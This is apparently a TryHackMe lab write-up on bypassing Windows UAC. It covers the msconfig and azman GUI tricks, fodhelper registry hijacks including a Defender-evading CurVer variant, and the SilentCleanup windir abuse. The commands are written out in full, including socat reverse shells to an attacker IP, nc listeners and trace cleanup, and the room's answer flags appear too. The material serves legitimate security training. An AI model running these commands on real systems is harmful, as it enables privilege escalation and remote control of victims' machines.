# Bypassing UAC - Medium

1. [User Account Control (UAC)](#user-account-control-uac)
2. [UAC: GUI based bypasses](#uac-gui-based-bypasses)
3. [UAC: Auto-elevating processes](#uac-auto-elevating-processes)
4. [UAC: Improving the Fodholper Exploit to Bypass Windows Defender](#uac-improving-the-fodholper-exploit-to-bypass-windows-defender)
5. [UAC: Environment Variable Expansion](#uac-environment-variable-expansion)

## User Account Control (UAC)

* UAC - Windows security feature that forces any new processes to run in the security context of a non-privileged account by default; applies to processes started by any user.

* Elevation in UAC is done to confirm that the user explicitly approves running the app in an administrative security context.

* UAC is a MIC (Mandatory Integrity Control), a mechanism that allows differentiating users, processes and resources by assigning an IL (Integrity Level) to each. Possible ILs are Low, Medium, High and System.

* UAC notification level settings:

  * Always notify
  * Notify me only when programs try to make changes to my computer - Default
  * Notify me only when programs try to make changes to my computer (do not dim my desktop)
  * Never notify

* Objective is to obtain access to a High IL command prompt without passing through UAC.

```markdown
1. What is the highest integrity level (IL) available on Windows? - System

2. What is the IL associated with an administrator's elevated token? - High

3. What is the full name of the service in charge of dealing with UAC elevation requests? - Application Information Service
```

## UAC: GUI based bypasses

* msconfig - msconfig process runs as a high IL process due to auto-elevation; wew can force msconfig to spawn a shell for us so that it runs as a high IL process.

```shell
#to get flag
C:\flags\GetFlag-msconfig.exe
```

* azman.msc - this process is also high IL due to auto-elevation; to get shell, go to Help > Help Topics > Right-Click anywhere > View Source > Spawns Notepad > File > Open > cmd.exe in C:\Windows\System32

```shell
#flag
C:\flags\GetFlag-azman.exe
```

```markdown
1. What flag is returned by running the msconfig exploit? - THM{UAC_HELLO_WORLD}

2. What flag is returned by running the azman.msc exploit? - THM{GUI_UAC_BYPASSED_AGAIN}
```

## UAC: Auto-elevating processes

* There are certain apps with certain requirements for auto-elevation with high IL.

* Fodhelper:

```shell
#according to given scenario
#we need to connect to given backdoor
#in attacker machine
nc 10.10.101.230 9999

#now through the backdoor connection
whoami
#myserver\attacker

net user attacker | find "Local Group"
#our user is part of Administrators group

whoami /groups | find "Label"
#it is running with a Medium IL

#we need to set required registry key values for reverse shell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command

set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.85.177:4444 EXEC:cmd.exe,pipes"

reg add %REG_KEY% /v "DelegateExecute" /d "" /f

reg add %REG_KEY% /d %CMD% /f

#setup listener in attacker machine
nc -lvp 4444

#on victim machine, run fodhelper
fodhelper.exe

#get flag
C:\flags\GetFlag-fodhelper.exe

#cleaning up our tracks
reg delete HKCU\Software\Classes\ms-settings\ /f
```

```markdown
1. What flag is returned by running the fodhelper exploit? - THM{AUTOELEVATE4THEWIN}
```

## UAC: Improving the Fodholper Exploit to Bypass Windows Defender

```shell
#in victim command prompt (via backdoor)
#for modified fodhelper exploit
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:10.11.85.177:4445 EXEC:cmd.exe,pipes"

reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f

reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f

fodhelper.exe

#now setup listener in attacker machine
nc -lvp 4445

#in victim machine
fodhelper.exe
#this gives us reverse shell

C:\flags\GetFlag-fodhelper-curver.exe
#flag

#clean up
reg delete "HKCU\Software\Classes\.thm\" /f

reg delete "HKCU\Software\Classes\ms-settings\" /f
```

```markdown
1. What flag is returned by running the fodhelper-curver exploit? - THM{AV_UAC_BYPASS_4_ALL}
```

## UAC: Environment Variable Expansion

```shell
#disk cleanup scheduled task exploit

#setup listener
nc -lvp 4446

#now through backdoor cmd prompt
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:10.11.85.177:4446 EXEC:cmd.exe,pipes &REM " /f

schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I

#this gives us reverse shell
#for flag
C:\flags\GetFlag-diskcleanup.exe

#cleanup
reg delete "HKCU\Environment" /v "windir" /f
```

```markdown
1. What flag is returned by running the DiskCleanup exploit? - THM{SCHEDULED_TASKS_AND_ENVIRONMENT_VARS}
```
